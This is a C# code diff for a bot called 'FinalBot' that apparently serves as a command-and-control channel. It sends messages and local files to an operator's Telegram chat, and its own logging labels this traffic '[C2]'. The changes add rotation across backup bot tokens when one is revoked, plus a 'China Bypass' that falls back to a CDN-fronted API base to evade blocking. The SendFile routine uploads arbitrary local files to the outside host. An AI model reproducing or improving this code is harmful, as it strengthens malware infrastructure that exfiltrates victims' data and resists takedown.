@@ -19,25 +19,48 @@ namespace FinalBot
         }
 
         private static HttpClient _client = new HttpClient();
-        private static string? _botToken;
+        private static string? _currentToken;
+        public static string? CurrentToken => _currentToken;
         private static string? _adminId;
-        private static string? _currentProxyUrl;
+        private static string[] _allTokens = Array.Empty<string>();
+        private static int _tokenIndex = 0;
 
-        public static void Initialize(string token, string adminId, HttpClient? client = null)
+        public static void Initialize(string? token, string adminId, HttpClient? client = null)
         {
-            _botToken = token;
             _adminId = adminId;
             if (client != null) _client = client;
+
+            // Load all 3 tokens from Vault
+            var t1 = SafetyManager.GetSecret("BOT_TOKEN_1");
+            var t2 = SafetyManager.GetSecret("BOT_TOKEN_2");
+            var t3 = SafetyManager.GetSecret("BOT_TOKEN_3");
+            
+            var list = new List<string>();
+            if (!string.IsNullOrEmpty(t1)) list.Add(t1);
+            if (!string.IsNullOrEmpty(t2)) list.Add(t2);
+            if (!string.IsNullOrEmpty(t3)) list.Add(t3);
+            
+            if (list.Count == 0 && !string.IsNullOrEmpty(token)) list.Add(token);
+            _allTokens = list.ToArray();
+            
+            if (_allTokens.Length > 0) _currentToken = _allTokens[0];
             
             // Initializing with default handler if not provided
             if (client == null) RecreateClient(null);
+        }
+
+        public static void RotateToken()
+        {
+            if (_allTokens.Length <= 1) return;
+            _tokenIndex = (_tokenIndex + 1) % _allTokens.Length;
+            _currentToken = _allTokens[_tokenIndex];
+            Console.WriteLine($"[C2] Rotating to backup token index: {_tokenIndex}");
         }
 
         private static void RecreateClient(string? proxyUrl)
         {
             try
             {
-                _currentProxyUrl = proxyUrl;
                 var handler = new SocketsHttpHandler
                 {
                     ConnectTimeout = TimeSpan.FromSeconds(10),
@@ -116,18 +139,25 @@ namespace FinalBot
                 if (!string.IsNullOrEmpty(proxyUrl)) handler.Proxy = new WebProxy(proxyUrl);
 
                 using var testClient = new HttpClient(handler);
-                // We use a high-stability endpoint for testing (Telegram API Base)
-                var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
-                if (string.IsNullOrEmpty(baseUrl)) baseUrl = "https://api.telegram.org/bot";
                 
-                // Fast HEAD request to check reachability
-                var request = new HttpRequestMessage(HttpMethod.Get, baseUrl + "test") { Version = HttpVersion.Version11 };
-                var response = await testClient.SendAsync(request, cts.Token);
+                // [PRO] China Bypass: Try multiple API bases
+                var primaryBase = SafetyManager.GetSecret("TG_API_BASE");
+                if (string.IsNullOrEmpty(primaryBase)) primaryBase = "https://api.telegram.org/bot";
                 
-                // 404 is actually GOOD here because it means we reached the server 
-                // but the method/token is invalid (which is expected for /test)
-                if (response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.NotFound || response.StatusCode == HttpStatusCode.Unauthorized)
-                    return true;
+                var secondaryBase = SafetyManager.GetSecret("TG_API_FRONT"); // CDN Fronting (Cloudflare/etc)
+                
+                string[] bases = { primaryBase };
+                if (!string.IsNullOrEmpty(secondaryBase)) bases = new string[] { primaryBase, secondaryBase };
+
+                foreach (var baseUrl in bases)
+                {
+                    try {
+                        var request = new HttpRequestMessage(HttpMethod.Get, baseUrl + "test") { Version = HttpVersion.Version11 };
+                        var response = await testClient.SendAsync(request, cts.Token);
+                        if (response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.NotFound || response.StatusCode == HttpStatusCode.Unauthorized)
+                            return true;
+                    } catch { }
+                }
             }
             catch { }
             return false;
@@ -162,90 +192,121 @@ namespace FinalBot
 
         public static async Task<bool> SendMessage(string text, string? replyMarkupJson = null)
         {
-            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId)) return false;
+            if (string.IsNullOrEmpty(_currentToken) || string.IsNullOrEmpty(_adminId)) return false;
 
-            try
+            for (int i = 0; i < Math.Max(1, _allTokens.Length); i++)
             {
-                var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
-                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/bot";
-                
-                var url = $"{baseUrl}{_botToken}/sendMessage";
-                var sb = new StringBuilder();
-                sb.Append("{");
-                sb.Append($"\"chat_id\":\"{_adminId}\",");
-                sb.Append($"\"text\":{EscapeJson(text)},");
-                sb.Append("\"parse_mode\":\"Html\"");
-                if (!string.IsNullOrEmpty(replyMarkupJson)) sb.Append($",\"reply_markup\":{replyMarkupJson}");
-                sb.Append("}");
-
-                var content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
-                var response = await _client.PostAsync(url, content);
-                
-                if (!response.IsSuccessStatusCode && response.StatusCode >= HttpStatusCode.InternalServerError)
+                try
                 {
-                    // Service failure? Try to rotate route
+                    var baseUrl = GetBaseUrl();
+                    var url = $"{baseUrl}{_currentToken}/sendMessage";
+                    var sb = new StringBuilder();
+                    sb.Append("{");
+                    sb.Append($"\"chat_id\":\"{_adminId}\",");
+                    sb.Append($"\"text\":{EscapeJson(text)},");
+                    sb.Append("\"parse_mode\":\"Html\"");
+                    if (!string.IsNullOrEmpty(replyMarkupJson)) sb.Append($",\"reply_markup\":{replyMarkupJson}");
+                    sb.Append("}");
+
+                    var content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
+                    var response = await _client.PostAsync(url, content);
+                    
+                    if (response.IsSuccessStatusCode) return true;
+
+                    if (response.StatusCode == HttpStatusCode.Unauthorized || response.StatusCode == HttpStatusCode.Forbidden)
+                    {
+                        RotateToken();
+                        continue;
+                    }
+
+                    if (response.StatusCode >= HttpStatusCode.InternalServerError)
+                        _ = FindBestRoute();
+                }
+                catch 
+                { 
                     _ = FindBestRoute();
                 }
+            }
+            return false;
+        }
 
-                return response.IsSuccessStatusCode;
-            }
-            catch 
-            { 
-                // Connection failed? Try to rotate route
-                _ = FindBestRoute();
-                return false; 
-            }
+        private static string GetBaseUrl()
+        {
+            var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
+            if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/";
+            if (!baseUrl.EndsWith("/")) baseUrl += "/";
+            if (!baseUrl.EndsWith("/bot") && !baseUrl.EndsWith("/bot/")) baseUrl += "bot";
+            return baseUrl;
         }
 
         public static async Task<bool> SendAnimation(string fileId, string caption = "", string? replyMarkupJson = null)
         {
-            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId)) return false;
-            try
+            if (string.IsNullOrEmpty(_currentToken) || string.IsNullOrEmpty(_adminId)) return false;
+
+            for (int i = 0; i < Math.Max(1, _allTokens.Length); i++)
             {
-                var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
-                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/bot";
+                try
+                {
+                    var baseUrl = GetBaseUrl();
+                    var url = $"{baseUrl}{_currentToken}/sendAnimation";
+                    var sb = new StringBuilder();
+                    sb.Append("{");
+                    sb.Append($"\"chat_id\":\"{_adminId}\",");
+                    sb.Append($"\"animation\":\"{fileId}\",");
+                    sb.Append($"\"caption\":{EscapeJson(caption)},");
+                    sb.Append("\"parse_mode\":\"Html\"");
+                    if (!string.IsNullOrEmpty(replyMarkupJson)) sb.Append($",\"reply_markup\":{replyMarkupJson}");
+                    sb.Append("}");
 
-                var url = $"{baseUrl}{_botToken}/sendAnimation";
-                var sb = new StringBuilder();
-                sb.Append("{");
-                sb.Append($"\"chat_id\":\"{_adminId}\",");
-                sb.Append($"\"animation\":\"{fileId}\",");
-                sb.Append($"\"caption\":{EscapeJson(caption)},");
-                sb.Append("\"parse_mode\":\"Html\"");
-                if (!string.IsNullOrEmpty(replyMarkupJson)) sb.Append($",\"reply_markup\":{replyMarkupJson}");
-                sb.Append("}");
+                    var content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
+                    var response = await _client.PostAsync(url, content);
+                    
+                    if (response.IsSuccessStatusCode) return true;
 
-                var content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
-                var response = await _client.PostAsync(url, content);
-                return response.IsSuccessStatusCode;
+                    if (response.StatusCode == HttpStatusCode.Unauthorized || response.StatusCode == HttpStatusCode.Forbidden)
+                    {
+                        RotateToken();
+                        continue;
+                    }
+                }
+                catch { }
             }
-            catch { return false; }
+            return false;
         }
 
         public static async Task<bool> SendFile(string filePath, string caption = "", string? replyMarkupJson = null)
         {
-            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId) || !File.Exists(filePath)) 
+            if (string.IsNullOrEmpty(_currentToken) || string.IsNullOrEmpty(_adminId) || !File.Exists(filePath)) 
                 return false;
 
-            try
+            for (int i = 0; i < Math.Max(1, _allTokens.Length); i++)
             {
-                var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
-                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/bot";
+                try
+                {
+                    var baseUrl = GetBaseUrl();
+                    var url = $"{baseUrl}{_currentToken}/sendDocument";
+                    using var form = new MultipartFormDataContent();
+                    form.Add(new StringContent(_adminId), "chat_id");
+                    if (!string.IsNullOrEmpty(caption)) form.Add(new StringContent(caption), "caption");
+                    if (!string.IsNullOrEmpty(replyMarkupJson)) form.Add(new StringContent(replyMarkupJson), "reply_markup");
+                    form.Add(new StringContent("Html"), "parse_mode");
 
-                var url = $"{baseUrl}{_botToken}/sendDocument";
-                using var form = new MultipartFormDataContent();
-                form.Add(new StringContent(_adminId), "chat_id");
-                if (!string.IsNullOrEmpty(caption)) form.Add(new StringContent(caption), "caption");
-                if (!string.IsNullOrEmpty(replyMarkupJson)) form.Add(new StringContent(replyMarkupJson), "reply_markup");
-                form.Add(new StringContent("Html"), "parse_mode");
+                    var fileContent = new ByteArrayContent(await File.ReadAllBytesAsync(filePath));
+                    form.Add(fileContent, "document", Path.GetFileName(filePath));
 
-                var fileContent = new ByteArrayContent(await File.ReadAllBytesAsync(filePath));
-                form.Add(fileContent, "document", Path.GetFileName(filePath));
+                    var response = await _client.PostAsync(url, form);
+                    
+                    if (response.IsSuccessStatusCode) return true;
 
-                var response = await _client.PostAsync(url, form);
-                return response.IsSuccessStatusCode;
+                    if (response.StatusCode == HttpStatusCode.Unauthorized || response.StatusCode == HttpStatusCode.Forbidden)
+                    {
+                        RotateToken();
+                        continue;
+                    }
+                }
+                catch { }
             }
-            catch { return false; }
+            return false;
         }
     }
 }
